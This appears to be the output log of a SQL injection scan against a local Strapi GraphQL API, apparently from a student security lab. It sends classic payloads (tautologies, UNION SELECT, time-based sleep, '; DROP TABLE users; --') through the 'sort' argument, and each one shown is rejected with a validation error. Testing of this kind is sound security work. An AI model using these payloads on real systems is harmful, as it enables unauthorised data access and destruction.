+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { authors(sort: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' AND 1=(SELECT COUNT(*) FROM tablename)--","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' AND 1=(SELECT COUNT(*) FROM tablename)--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' AND 1=(SELECT COUNT(*) FROM tablename)--","details":{"key":"' AND 1=(SELECT COUNT(*) FROM tablename)--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+[>] Testing categories_connection (string args: ['sort'])
+
+[>] Testing categories (string args: ['sort'])
+
+
+	Payload:  '
+	Query: query { categories(sort: " '") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key '","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key '","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key '","details":{"key":"'","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR '1'='1
+	Query: query { categories(sort: "' OR '1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' OR '1'='1","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR '1'='1","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR '1'='1","details":{"key":"' OR '1'='1","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR 1=1--
+	Query: query { categories(sort: "' OR 1=1--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' OR 1=1--","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR 1=1--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR 1=1--","details":{"key":"' OR 1=1--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR 'a'='a
+	Query: query { categories(sort: "' OR 'a'='a") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' OR 'a'='a","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR 'a'='a","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR 'a'='a","details":{"key":"' OR 'a'='a","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { categories(sort: "' UNION SELECT NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' UNION SELECT NULL--","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' UNION SELECT NULL--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' UNION SELECT NULL--","details":{"key":"' UNION SELECT NULL--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { categories(sort: "'; DROP TABLE users; --") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key '; DROP TABLE users; --","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key '; DROP TABLE users; --","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key '; DROP TABLE users; --","details":{"key":"'; DROP TABLE users; --","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { categories(sort: "' AND 1=0 UNION SELECT NULL,NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' AND 1=0 UNION SELECT NULL","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' AND 1=0 UNION SELECT NULL","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:18:71","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:18:53","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29"],"error":{"name":"ValidationError","message":"Invalid key ' AND 1=0 UNION SELECT NULL","details":{"key":"' AND 1=0 UNION SELECT NULL","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ') OR ('1'='1
+	Query: query { categories(sort: "') OR ('1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ') OR ('1'='1","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ') OR ('1'='1","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ') OR ('1'='1","details":{"key":"') OR ('1'='1","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: admin' --
+	Query: query { categories(sort: "admin' --") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key admin' --","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key admin' --","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key admin' --","details":{"key":"admin' --","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { categories(sort: "' OR sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' OR sleep(5)--","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR sleep(5)--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR sleep(5)--","details":{"key":"' OR sleep(5)--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { categories(sort: "' AND sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' AND sleep(5)--","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' AND sleep(5)--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' AND sleep(5)--","details":{"key":"' AND sleep(5)--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { categories(sort: "' WAITFOR DELAY '0:0:5'--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' WAITFOR DELAY '0","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' WAITFOR DELAY '0","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' WAITFOR DELAY '0","details":{"key":"' WAITFOR DELAY '0","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { categories(sort: "' OR 'x'='x' /*") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' OR 'x'='x' /*","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR 'x'='x' /*","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR 'x'='x' /*","details":{"key":"' OR 'x'='x' /*","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { categories(sort: "' OR EXISTS(SELECT * FROM users)--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' OR EXISTS(SELECT * FROM users)--","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR EXISTS(SELECT * FROM users)--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR EXISTS(SELECT * FROM users)--","details":{"key":"' OR EXISTS(SELECT * FROM users)--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { categories(sort: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' AND 1=(SELECT COUNT(*) FROM tablename)--","path":["categories"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' AND 1=(SELECT COUNT(*) FROM tablename)--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' AND 1=(SELECT COUNT(*) FROM tablename)--","details":{"key":"' AND 1=(SELECT COUNT(*) FROM tablename)--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
